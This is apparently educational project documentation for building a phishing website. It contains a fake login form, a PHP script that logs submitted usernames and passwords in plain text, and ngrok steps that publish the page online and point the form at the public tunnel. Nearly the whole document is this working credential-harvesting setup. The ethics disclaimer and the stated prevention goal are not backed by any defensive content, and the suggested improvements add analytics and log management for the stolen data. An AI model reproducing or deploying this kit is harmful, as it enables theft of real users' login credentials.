# **Project Documentation: Simulation of a Phishing Website**

## **Project Description**

This project is a simulation of a phishing website designed to study phishing methods and prevent such attacks. The project uses **XAMPP** to run a local server, **Ngrok** to publish the server online, and **Webhook** mechanisms to transfer data from an HTML form to the server.

---

## **Project Goals**

1. Demonstrate how phishing websites work.
    
2. Study data collection methods using HTML and PHP.
    
3. Explore ways to prevent phishing attacks, including setting up web filters, using HTTPS, and handling data securely.
    
4. Educate cybersecurity professionals through practical exploration of phishing mechanisms.
    

---

## **Technologies Used**

- **XAMPP:** Local web server for running PHP scripts.
    
- **Ngrok:** A tool to publish the local server online.
    
- **Webhook:** Mechanism to transfer data between the HTML form and the server in real-time.
    
- **HTML:** For creating the user interface (login form).
    
- **PHP:** For processing the data submitted via the form.
    

---

## **Steps for Developing the Phishing Website**

### **Step 1. Installing XAMPP**

**Purpose:**  
XAMPP provides a local server to process PHP scripts and test web applications. Without XAMPP, it is not possible to run a server to receive and process data.

**Steps:**

1. Download XAMPP from the official website: [https://www.apachefriends.org/](https://www.apachefriends.org/).
    
2. Install XAMPP on your computer by following the installer instructions.
    
3. Start XAMPP and activate the **Apache** module.
    

---

### **Step 2. Creating the Phishing HTML Page**

**Purpose:**  
The HTML page serves as the interface for users to input their data. It is a key component for simulating a phishing attack.

**Steps:**

1. Create an HTML file `index.html` with a login form. Here is a sample code:
    
    ```
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login Page</title>
    </head>
    <body>
        <form action="http://localhost/site/send_email.php" method="POST">
            <input type="text" name="username" placeholder="Enter your username" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Submit</button>
        </form>
    </body>
    </html>
    ```
    
2. Save the file in the `htdocs` folder within the XAMPP directory. For example: `C:\xampp\htdocs\site`.
    

---

### **Step 3. Writing the PHP Script**

**Purpose:**  
The PHP script processes the data submitted from the HTML form and saves it to a log file.

**Steps:**

1. Create a PHP file `send_email.php`:
    
    ```
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = $_POST['username'];
        $password = $_POST['password'];
    
        // Save the data to a log file
        $log_file = 'log.txt';
        $log_data = "Username: $username, Password: $password\n";
        file_put_contents($log_file, $log_data, FILE_APPEND);
    
        echo "Data successfully received.";
    } else {
        echo "No data to process.";
    }
    ?>
    ```
    
2. Save the file `send_email.php` in the same directory as the HTML file.
    

---

### **Step 4. Setting Up Ngrok**

**Purpose:**  
Ngrok makes the local server accessible online, enabling external users to access the phishing page.

**Steps:**

1. Download Ngrok from the official website: [https://ngrok.com/](https://ngrok.com/).
    
2. Install Ngrok on your computer and authenticate with the provided token.
    
3. Start the tunnel using the command:
    
    ```
    ngrok http 80
    ```
    
4. Copy the generated HTTPS URL (e.g., `https://a6c9-78-29-192-45.ngrok-free.app`).
    
5. Replace the `action` in the HTML form code with this URL:
    
    ```
    <form action="https://a6c9-78-29-192-45.ngrok-free.app/send_email.php" method="POST">
    ```
    

---

### **Step 5. Testing**

**Purpose:**  
Testing ensures the project works correctly and data is recorded in the log file.

**Steps:**

1. Open the public URL provided by Ngrok in a browser.
    
2. Enter test data in the form (username and password).
    
3. Check the `log.txt` file in the project directory. The data should be recorded in the following format:
    
    ```
    Username: test_user, Password: test_password
    ```
    

---

## **Potential Improvements**

1. **Add a Database:**
    
    - Use MySQL instead of a text file for data storage.
        
2. **Analytics:**
    
    - Implement scripts to analyze collected data.
        
3. **Admin Interface:**
    
    - Create a web interface to view and manage logs.
        
4. **Integration with Security Tools:**
    
    - Develop a scanner to detect phishing activity based on the simulation.
        

---

## **Ethical Use**

- **Purpose of the Project:** This project is intended solely for educational and analytical purposes. It must not be used for real phishing attacks.
    
- **Consent of Participants:** Any testing of the project should be conducted only with user consent.
    
- **Data Protection:** All test data must be anonymized and protected from leaks.
    

---

## **Conclusion**

This project serves as a learning tool to understand how phishing attacks work and how to use this knowledge to prevent them. Using XAMPP, Ngrok, and Webhook mechanisms, you can create a fully functional phishing site for testing and developing protective solutions.